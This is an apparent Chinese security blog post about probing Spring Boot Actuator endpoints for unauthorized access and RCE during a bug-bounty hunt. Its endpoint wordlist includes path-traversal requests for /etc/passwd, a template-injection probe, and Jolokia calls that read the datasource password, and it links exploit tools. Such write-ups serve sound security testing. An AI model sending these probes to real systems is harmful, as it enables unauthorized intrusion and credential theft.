@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>记一次Springboot未授权到RCE - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="记一次后下手为慢无奖励的专属src挖掘，信息收集就不说了，反正就是那几套姿势，无非看谁的字典好使，谁花的时间多，谁心更细。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次Springboot未授权到RCE">
+<meta property="og:url" content="https://b1gd0g.github.io/2022/01/14/%E8%AE%B0%E4%B8%80%E6%AC%A1src%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%B0RCE/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="记一次后下手为慢无奖励的专属src挖掘，信息收集就不说了，反正就是那几套姿势，无非看谁的字典好使，谁花的时间多，谁心更细。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234939.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234944.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234949.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234953.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234957.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221235001.jpg">
+<meta property="article:published_time" content="2022-01-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-30T03:51:08.594Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234939.jpg">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214417">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1665474214417">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>15</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://spring.io/images/spring-logo-9146a4d3298760c2e7e49595184e1975.svg" alt="记一次Springboot未授权到RCE" loading="lazy">
+            <h1>记一次Springboot未授权到RCE</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年01月14日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约2.2k字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要10分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>记一次后下手为慢无奖励的专属src挖掘，信息收集就不说了，反正就是那几套姿势，无非看谁的字典好使，谁花的时间多，谁心更细。</p>
+<a id="more"></a>
+
+<h2 id="001—知已知彼"><a href="#001—知已知彼" class="headerlink" title="001—知已知彼"></a>001—知已知彼</h2><ul>
+<li><p>Spring Boot 1.x 版本默认内置路由的根路径以 / 开始，2.x 则统一以 /actuator 开始</p>
+</li>
+<li><p>有些程序员会自定义 /manage、/management 或 项目相关名称 为根路径</p>
+</li>
+<li><p>默认内置路由名字，如 /env 有时候也会被程序员修改，如修改成 /appenv</p>
+</li>
+</ul>
+<p>先来简单介绍一下常见的springboot常见部分接口的作用吧：</p>
+<table>
+<thead>
+<tr>
+<th>/autoconfig</th>
+<th>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/configprops</td>
+<td>描述配置属性（包含默认值）如何注入 Bean</td>
+</tr>
+<tr>
+<td>/beans</td>
+<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
+</tr>
+<tr>
+<td>/dump</td>
+<td>获取线程活动的快照</td>
+</tr>
+<tr>
+<td>/env</td>
+<td>获取全部环境属性</td>
+</tr>
+<tr>
+<td>/env/{name}</td>
+<td>根据名称获取特定的环境属性值</td>
+</tr>
+<tr>
+<td>/health</td>
+<td>报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供</td>
+</tr>
+<tr>
+<td>/info</td>
+<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
+</tr>
+<tr>
+<td>/mappings</td>
+<td>描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系</td>
+</tr>
+<tr>
+<td>/metrics</td>
+<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
+</tr>
+<tr>
+<td>/metrics/{name}</td>
+<td>报告指定名称的应用程序度量值</td>
+</tr>
+<tr>
+<td>/shutdown</td>
+<td>关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）</td>
+</tr>
+<tr>
+<td>/trace</td>
+<td>提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）</td>
+</tr>
+</tbody></table>
+<h2 id="002—投石问路"><a href="#002—投石问路" class="headerlink" title="002—投石问路"></a>002—投石问路</h2><p>下面是一些个人比较常用的接口字典：</p>
+<p>（同时有个细节就是可能以下目录会存在于某个子文件夹下面，缘分靠自己爆破）：</p>
+<p>admin/</p>
+<p>web/</p>
+<p>gateway/</p>
+<p>manage/</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br></pre></td><td class="code"><pre><code class="hljs bash">/<br>/<span class="hljs-comment">#/wallboard</span><br>/%20/swagger-ui.html<br>/Swagger/ui/index<br>/acl/article?id=66<br>/acm<br>/actuator<br>/actuator/<span class="hljs-comment">#/wallboard</span><br>/actuator/acm<br>/actuator/admin/swagger-ui.html<br>/actuator/api-docs<br>/actuator/api.html<br>/actuator/api/index.html<br>/actuator/api/swagger-ui.html<br>/actuator/api/v2/api-docs<br>/actuator/api/v2/swagger.json<br>/actuator/archaius<br>/actuator/archaius/actuator/nacosdiscovery<br>/actuator/article?id=<span class="hljs-variable">$&#123;7*7&#125;</span><br>/actuator/article?id=66<br>/actuator/auditevents<br>/actuator/auditevents/actuator/intergrationgraph<br>/actuator/autoconfig<br>/actuator/beans<br>/actuator/beans/actuator/jolokia<br>/actuator/beans1<br>/actuator/caches<br>/actuator/caches/actuator/refresh<br>/actuator/caches/cache<br>/actuator/channels<br>/actuator/conditions<br>/actuator/conditions/actuator/jolokia/list<br>/actuator/conditions1<br>/actuator/configprops<br>/actuator/configprops/actuator/nacos<br>/actuator/distv2/index.html<br>/actuator/docs<br>/actuator/druid/login.html<br>/actuator/dubbo-provider/distv2/index.html<br>/actuator/dump<br>/actuator/env<br>/actuator/env/actuator/liquibase<br>/actuator/env/java.home<br>/actuator/env/spring.jmx.enabled<br>/actuator/env/system<br>/actuator/features<br>/actuator/features/actuator/peripheral/swagger-ui.html<br>/actuator/flyway<br>/actuator/gateway<br>/actuator/h2-console<br>/actuator/health<br>/actuator/health/<br>/actuator/health/actuator/loggers<br>/actuator/health/nacos<br>/actuator/heapdump<br>/actuator/heapdump/actuator/loggers/nacos<br>/actuator/httptrace<br>/actuator/httptrace/actuator/mappings<br>/actuator/hystrix.stream<br>/actuator/hystrix.stream/*/actuator/swagger<br>/actuator/info<br>/actuator/info/actuator/metrics<br>/actuator/jolokia<br>/actuator/jolokia/*/actuator/static/swagger.json<br>/actuator/logfile<br>/actuator/logfile/actuator/sw/swagger-ui.html<br>/actuator/loggers<br>/actuator/loggers/<br>/actuator/loggers/actuator/metrics/nacos<br>/actuator/management/heapdump<br>/actuator/mappings<br>/actuator/mappings/actuator/monitor/conditions<br>/actuator/metrics<br>/actuator/metrics/<br>/actuator/metrics/actuator/monitor/env<br>/actuator/monitor/auditevents<br>/actuator/monitor/loggers<br>/actuator/nacos-config/actuator/swagger-resourcesce<br>/actuator/nacos-discovery/actuator/swagger-ui<br>/actuator/nacosconfig<br>/actuator/prometheus/actuator/swagger-dubbo/api-docs<br>/actuator/refresh/actuator/peripheral/v2/api-docs<br>/actuator/restart<br>/actuator/scheduledtasks<br>/actuator/scheduledtasks/actuator/monitor/mappings<br>/actuator/sentinel<br>/actuator/service-registry/actuator/prometheus<br>/actuator/sessions/<br>/actuator/sessions/actuator/swagger-ui.html<br>/actuator/swagger-ui/index.html<br>/actuator/template/swagger-ui.html<br>/actuator/threaddump<br>/actuator/threaddump/actuator/monitor/scheduledtasks<br>/actuator/trace<br>/actuator/user/swagger-ui.html<br>/api-docs<br>/api.html<br>/api/swagger-ui.html<br>/api/v2/login<br>/api/v2/swagger-resources<br>/api/v2/swagger-ui.html<br>/article?id=<span class="hljs-variable">$&#123;7*7&#125;</span><br>/auditevents<br>/autoconfig<br>/beans<br>/beans1<br>/caches<br>/channels<br>/clients<br>/clients/actuator/system/showOsInfo<br>/clients/all/actuator/tra<br>/clients/saveOrUpdate/actuator/trace<br>/cloudfoundryapplication<br>/conditions<br>/conditions1<br>/configprops<br>/distv2/index.html<br>/doc.html<br>/docs<br>/docs/<br>/druid/*/actuator/swagger/codes<br>/druid/api.html<br>/druid/basic.json<br>/druid/datasource.html<br>/druid/index.html<br>/druid/login.html<br>/druid/spring.html<br>/druid/sql.html<br>/druid/wall.html<br>/druid/webapp.html<br>/druid/websession.html<br>/druid/weburi.html<br>/dubbo-provider/distv2/index.html<br>/dump<br>/entity/all<br>/env<br>/env/java.home<br>/env/nacos<br>/env/spring<br>/env/spring.jmx.enabled<br>/error/actuator/monitor/threaddump<br>/eureka<br>/eureka/*/actuator/service-registry<br>/features<br>/flyway<br>/gateway/actuator<br>/gateway/actuator/auditevents<br>/gateway/actuator/beans<br>/gateway/actuator/conditions<br>/gateway/actuator/configprops<br>/gateway/actuator/env<br>/gateway/actuator/health<br>/gateway/actuator/heapdump<br>/gateway/actuator/httptrace<br>/gateway/actuator/hystrix.stream<br>/gateway/actuator/info<br>/gateway/actuator/jolokia<br>/gateway/actuator/logfile<br>/gateway/actuator/loggers<br>/gateway/actuator/mappings<br>/gateway/actuator/metrics<br>/gateway/actuator/scheduledtasks<br>/gateway/actuator/swagger-ui.html<br>/gateway/actuator/threaddump<br>/gateway/actuator/trace<br>/get<br>/get?serviceName=springboot2-nacos-discovery<br>/h2-console<br>/health<br>/heapdump<br>/heapdump.json<br>/httptrace<br>/hystrix<br>/hystrix.stream<br>/info<br>/intergrationgraph<br>/jolokia<br>/jolokia/<span class="hljs-built_in">exec</span>/org.springframework.cloud.context.environment:name=environmentManager,<span class="hljs-built_in">type</span>=EnvironmentManager/getProperty/spring.datasource.password<br>/jolokia/<span class="hljs-built_in">exec</span>/org.springframework.cloud.context.environment:name=environmentManager,<span class="hljs-built_in">type</span>=EnvironmentManager/getProperty/spring.datasource.url<br>/jolokia/list<br>/lastn/actuator/sessions<br>/libs/swaggerui<br>/liquibase<br>/<span class="hljs-built_in">log</span>/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<br>/<span class="hljs-built_in">log</span>/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../<br>/logfile<br>/loggers<br>/login/admin/swagger-ui.html<br>/manage/<span class="hljs-built_in">log</span>/view?filename=/etc/passwd&amp;base=../../../../../../../../../../<br>/manage/<span class="hljs-built_in">log</span>/view?filename=/windows/win.ini&amp;base=../../../../../../../../../../<br>/management/heapdump<br>/mappings<br>/metrics<br>/metrics/<br>/metrics/mem<br>/metrics/nacos<br>/monitor<br>/monitor/auditevents<br>/monitor/conditions<br>/monitor/env<br>/monitor/loggers<br>/monitor/mappings<br>/monitor/scheduledtasks<br>/monitor/threaddump<br>/nacos<br>/nacos/v1/cs/configs<br>/nacos/v1/cs/configs?dataId=Misplaced<br>/nacos/v1/ns/instance<br>/nacos/v1/ns/instance?serviceName=springboot2-nacos-discovery<br>/nacos/v2/cs/configs<br>/nacos/v2/cs/configs?dataId=Misplaced<br>/nacos/v2/ns/instance<br>/nacos/v2/ns/instance?serviceName=springboot2-nacos-discovery<br>/oauth/authorize/actuator/swagger/index.html<br>/oauth/check_token/actuator/swagger/static/index.html<br>/oauth/client/token/api-docs<br>/oauth/confirm_access/actuator/system/<br>/oauth/error/actuator/system/env<br>/oauth/get/token/api.html<br>/oauth/refresh/token/api/doc<br>/oauth/remove/token/api/index.html<br>/oauth/token/actuator/system/mappings<br>/oauth/token/list/api/swagger<br>/oauth/user/token/api/swagger-resources<br>/oauth/userinfo/api/swagger-ui.html<br>/peripheral/swagger-ui.html<br>/peripheral/v2/api-docs<br>/prometheus<br>/redis/keysSize/api/swagger/ui<br>/redis/memoryInfo/api/swaggerui<br>/refresh<br>/restart<br>/scheduledtasks<br>/services<br>/services/1<br>/services/api/v2/api-docs<br>/services/findAlls/api/v1/api-docs<br>/services/findOnes/api/v1/login<br>/services/granted/api/v1/swagger-resources<br>/services/saveOrUpdate/api/v1/swagger-ui.html<br>/sessions<br>/shutdown<br>/spring-security-oauth-resource/swagger-ui.html<br>/spring-security-rest/api/swagger-ui.html<br>/static/swagger.json<br>/sw/swagger-ui.html<br>/swagger<br>/swagger-dubbo/api-docs<br>/swagger-resources<br>/swagger-resources/actuator/shutdown<br>/swagger-resources/configuration/security<br>/swagger-resources/configuration/security/actuator/spring-security-oauth-resource/swagger-ui.html<br>/swagger-resources/configuration/ui<br>/swagger-resources/configuration/ui/actuator/spring-security-rest/api/swagger-ui.html<br>/swagger-ui<br>/swagger-ui.html<br>/swagger-ui.html<span class="hljs-comment">#</span><br>/swagger-ui.html/api/v2/swagger.json<br>/swagger-ui/html<br>/swagger-ui/index.html<br>/swagger/codes<br>/swagger/index.html<br>/swagger/static/index.html<br>/swagger/swagger-ui.html<br>/swagger/ui<br>/swagger/v1/swagger.json<br>/swagger/v2/swagger.json<br>/system/<br>/system/druid/index.html<br>/system/env<br>/system/mappings<br>/system/showOsInfo<br>/system/showProperties<br>/template/swagger-ui.html<br>/threaddump<br>/trace<br>/user/swagger-ui.html<br>/v1.1/swagger-ui.html<br>/v1.2/swagger-ui.html<br>/v1.3/swagger-ui.html<br>/v1.4/swagger-ui.html<br>/v1.5/swagger-ui.html<br>/v1.6/swagger-ui.html<br>/v1.7/swagger-ui.html<br>/v1.8/swagger-ui.html<br>/v1.9/swagger-ui.html<br>/v1/agent/self/actuator/system/showProperties<br>/v1/api-docs<br>/v1/catalog/service/app<br>/v1/catalog/services/actuator/threaddump<br>/v2.0/swagger-ui.html<br>/v2.1/swagger-ui.html<br>/v2.2/swagger-ui.html<br>/v2.3/swagger-ui.html<br>/v2/api-docs<br>/v2/api-docs?group=swagger接口文档<br>/v2/swagger.json<br>/v3/api-docs<br>/validata/code<br>/webjars/**/actuator/nacosconfig<br>/webpage/system/druid/index.html<br>/api/index.html<br>/api/v2/api-docs<br>/actuator/swagger-ui.html<br>/env/(name)<br></code></pre></td></tr></table></figure>
+<h2 id="003—依样画瓢"><a href="#003—依样画瓢" class="headerlink" title="003—依样画瓢"></a>003—依样画瓢</h2><p>目标存在很多未授权接口，就可能存在好几种方式的RCE漏洞</p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234939.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>我一般遇到很多可访问的接口都先用工具过一下，因为工具可以简单帮忙判断是否存在利用条件，而不是一个一个接口去访问。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/SB-Actuator">https://github.com/rabbitmask/SB-Actuator</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0x727/SpringBootExploit">https://github.com/0x727/SpringBootExploit</a></p>
+<p><img data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img20220221234944.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<h2 id="004—迷途知返"><a href="#004—迷途知返" class="headerlink" title="004—迷途知返"></a>004—迷途知返</h2><p>有一说一，我对上面可能存在的RCE的利用姿势都试了一遍，不知道是我人品太差了还是怎么滴，没有一个可以RCE，搞到大半夜我都开始怀疑人生。</p>
+<p>复现参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
